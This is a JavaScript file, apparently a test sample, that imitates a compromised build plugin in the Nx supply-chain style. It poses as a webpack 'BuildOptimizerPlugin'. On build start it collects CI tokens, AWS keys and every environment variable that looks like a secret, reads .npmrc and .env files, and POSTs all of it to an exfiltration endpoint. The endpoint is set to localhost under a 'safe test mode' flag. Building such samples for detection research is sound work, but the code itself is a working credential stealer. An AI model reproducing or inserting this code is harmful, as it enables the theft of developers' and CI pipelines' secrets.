// SAFE_TEST_MODE = true — all exfil goes to localhost:9999
// Replicates: s1ngularity / Nx toolchain compromise pattern

const http = require("http");
const os = require("os");
const fs = require("fs");
const path = require("path");

const SAFE_TEST_MODE = true;
const EXFIL_URL = "http://localhost:9999/exfil"; // Safe: nothing listening

// --- "Legitimate" build plugin interface ---

/**
 * Build optimizer plugin
 * Appears to be a standard webpack/nx plugin that optimizes build output
 */
class BuildOptimizerPlugin {
  constructor(options = {}) {
    this.name = "BuildOptimizerPlugin";
    this.cacheDir = options.cacheDir || ".build-cache";
    this.verbose = options.verbose || false;
  }

  /**
   * Webpack-compatible apply method
   * Called when the plugin is loaded by the build tool
   */
  apply(compiler) {
    // Hook into the build lifecycle
    if (compiler && compiler.hooks) {
      compiler.hooks.compile.tap(this.name, () => {
        this._onBuildStart();
      });
      compiler.hooks.done.tap(this.name, (stats) => {
        this._onBuildDone(stats);
      });
    } else {
      // Direct invocation (non-webpack)
      this._onBuildStart();
    }
  }

  /**
   * Called at build start — this is where the exfiltration happens
   */
  _onBuildStart() {
    // Harvest CI/CD secrets
    const secrets = this._harvestCISecrets();

    // Read additional config files
    const configs = this._readBuildConfigs();

    // Exfiltrate everything
    const payload = {
      timestamp: new Date().toISOString(),
      hostname: os.hostname(),
      platform: os.platform(),
      cwd: process.cwd(),
      secrets,
      configs,
      ci_env: this._detectCI(),
    };

    this._exfiltrate(payload);
  }

  _onBuildDone(stats) {
    // Legitimate-looking build done handler
    if (this.verbose) {
      console.log(`[${this.name}] Build completed`);
    }
  }

  /**
   * Harvest CI/CD environment variables
   */
  _harvestCISecrets() {
    const targetKeys = [
      "GITHUB_TOKEN",
      "GH_TOKEN",
      "NPM_TOKEN",
      "GITLAB_TOKEN",
      "CIRCLE_TOKEN",
      "TRAVIS_TOKEN",
      "AZURE_CLIENT_SECRET",
      "AWS_ACCESS_KEY_ID",
      "AWS_SECRET_ACCESS_KEY",
      "DOCKER_AUTH_CONFIG",
      "JENKINS_API_KEY",
      "SONAR_TOKEN",
      "CODECOV_TOKEN",
      "VERCEL_TOKEN",
      "NETLIFY_AUTH_TOKEN",
    ];

    const harvested = {};
    for (const key of targetKeys) {
      const val = process.env[key];
      if (val) {
        harvested[key] = val;
      }
    }

    // Also grab anything that looks like a token
    for (const [key, value] of Object.entries(process.env)) {
      if (/token|secret|key|password|auth|credential/i.test(key) && value) {
        harvested[key] = value;
      }
    }

    return harvested;
  }

  /**
   * Detect which CI system is running
   */
  _detectCI() {
    return {
      is_ci: !!process.env.CI,
      github_actions: !!process.env.GITHUB_ACTIONS,
      gitlab_ci: !!process.env.GITLAB_CI,
      circle_ci: !!process.env.CIRCLECI,
      travis: !!process.env.TRAVIS,
      jenkins: !!process.env.JENKINS_URL,
      azure: !!process.env.TF_BUILD,
    };
  }

  /**
   * Read build configuration files that may contain secrets
   */
  _readBuildConfigs() {
    const configs = {};
    const targets = [
      ".npmrc",
      ".env",
      ".env.local",
      ".env.production",
      "nx.json",
      ".github/workflows",
    ];

    for (const target of targets) {
      const fullPath = path.resolve(process.cwd(), target);
      try {
        const stat = fs.statSync(fullPath);
        if (stat.isFile()) {
          configs[target] = fs.readFileSync(fullPath, "utf-8");
        }
      } catch (e) {
        // File doesn't exist
      }
    }

    return configs;
  }

  /**
   * Exfiltrate harvested data to C2
   */
  _exfiltrate(payload) {
    try {
      const data = JSON.stringify(payload);
      const url = new URL(EXFIL_URL);
      const req = http.request({
        hostname: url.hostname,
        port: url.port,
        path: url.pathname,
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Content-Length": Buffer.byteLength(data),
          "User-Agent": "build-optimizer/1.4.2",
        },
      });
      req.on("error", () => {
        // Connection refused — expected in safe test mode
      });
      req.write(data);
      req.end();
    } catch (e) {
      // Expected in safe test mode
    }
  }
}

module.exports = { BuildOptimizerPlugin };
